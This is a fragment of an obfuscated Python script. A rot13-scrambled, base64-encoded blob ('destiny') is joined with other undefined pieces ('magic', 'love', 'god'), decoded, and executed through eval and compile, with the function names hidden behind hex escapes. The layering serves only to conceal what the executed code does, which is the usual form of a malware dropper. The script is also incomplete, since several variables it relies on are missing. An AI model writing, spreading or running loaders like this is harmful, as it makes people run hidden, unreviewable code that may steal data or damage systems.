destiny = 'HlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXtbvVvVcPtyzo3VtnFOcovOlLJ5aMFNbL3Wup2tcBtbWPKOlnJ50XPxXPDyjpzyhqPuzVagMsIg7I33vaWA7JK1qVSAyozEcozptGz93VvxXPDyfnJ5eZFN9VT9mYaA5p3EyoFufnJ5eXDbWPKEcoJHhp2kyMKNbAFxXPDycMvOfnJ5eZFN9CFNjBtbWPDyjpzyhqPuzVagUsFOGqJAwMKAmMaIfVSAyozDt8W+EwFOWoaA0LFONn3Wcp2usozSsZwH2BPVcPtxWPKOup3ZXPDyyoUAyBtbWPDyjpzyhqPuzVagUsIiQy10tEzScoTIxVPNvXDbWPKEcoJHhp2kyMKNbZP4lXDbWpzImXPxXMTIzVT1unJ4bXGbXPJAbMJAeK2yhqUVbXDbWo3Zhp3ymqTIgXPqwoTIupvpcPtyjpzyhqPufo2qiXDbWpUWcoaDbJFxXPJ9mYaA5p3EyoFuzW2EuqQ0xXTEuqTHcVPLzVTIwnT8tr1y9VPQvaX8tr1q9H1EOHyESEPOCGvN6VUgQsFExLKDaXDbWpUWcoaDbMvW7I31pov0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gVvxXPKOlnJ50XTLvr1y94cduVSEbnKZtqT9ioPOcplOiozk5VTMipvOSMUIwLKEco25uoPODqKWjo3AyplNuVvxXPKOlnJ50XTLvr1q9YF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0vXDbWpUWcoaDbMvWpoagUsHAbo29mMFOOoaxtG3O0nJ9hKT4vXDbWqTI4qPN9VPuzVvVvr0q9J3gKsGS7E31qr1W9VRWuLKOUYHSHIRSQFlO7I30+Cw5poagUsIg7I30lr0q9KKgMsFOKFRSHH0SDHPOPG01PEIW7I30tCw4+KT57E31or1q9Z3gUsI17JK0tDJWiqKDtr1q9Cw4+KT57E31or1q9AUgUsI17JK0tEKucqPO7I30+Cw5povVvVvxXPKOlnJ50XUEyrUDcPtyuVQ0tnJ5jqKDbMvW7Ha0tCw4+VUgUsFVcPtycMvOuVQ09VPpkWmbXPDymoKZbXDbWMJkcMvOuVQ09VPplWmbXPDy3pTWioJVbXDbWMJkcMvOuVQ09VPpmWmbXPDyjpzyhqPuzVagQsIkhVRSfoPOQpzIxnKDtBvOYpzymnT5uVSAcozqbVSWunaO1qPOpovO7E31Qo2EyMPOvrFOOoaAbVREuMUquoSkhKT57I317oTywsIkhKT4vXDbWPKWypltcPDbWMJkcMvOuVQ09VPp0WmbXPDymrKZhMKucqPtkXDbWMJkmMGbXPDylMKE1pz4toJScovtcPDcxMJLtpzImXPx6PtylCJyhpUI0XTLvr1y9ET8trJ91VUquoaDtqT8tpzImqTSlqPOorF9hKFN9VPVcPtycMvOlVQ09W3xaBtbWPJ1unJ4bXDbWMJkmMGbXPDyjpzyhqPubZFxXPDyjpzyhqPuzVxMioTkiqlOiovOWMlN6VUgKsHOepzymnS9hLI8lAGL4VvxXPDyyrTy0XPxXpUWcoaDbH3E5oTHhDyWWE0uHXDxWPz1unJ4bXD=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
